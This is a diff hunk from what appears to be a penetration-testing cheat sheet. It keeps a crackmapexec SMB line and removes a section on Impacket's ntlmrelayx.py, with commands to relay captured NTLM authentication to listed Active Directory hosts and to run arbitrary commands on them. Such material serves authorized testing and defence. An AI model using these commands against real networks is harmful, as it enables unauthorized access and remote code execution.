@@ -114,28 +114,3 @@ proxychains crackmapexec smb <target-ip> -u <user> -p <anypassword> -d <domain>
 
 ---
 
-
-## NTLMRelayx.py
-
-**ntlmrelayx.py** is a powerful tool from the Impacket toolkit used for relaying captured NTLM authentication attempts to other network services. It is particularly effective in Windows Active Directory (AD) environments, allowing attackers to gain unauthorized access to network resources by relaying credentials.
-
-#### Configuring Target List:
-
-- Create a `targets.txt` file with the IP addresses or hostnames of the target AD servers you want to relay the captured credentials to.
-```bash
-192.168.1.10 
-192.168.1.11
-```
-
-#### Starting NTLMRelayx.py:
-
-- Use NTLMRelayx.py to relay captured NTLM authentication attempts to the targets listed in `targets.txt`.
-```bash
-sudo ntlmrelayx.py -tf targets.txt -smb2support
-```
-- Also, NTLMRelayx.py can be configured to execute a certain command of our election after pawning one of the target hosts. 
-```bash
-sudo ntlmrelayx.py -tf targets.txt -smb2support -c "<command>"
-```
-
-
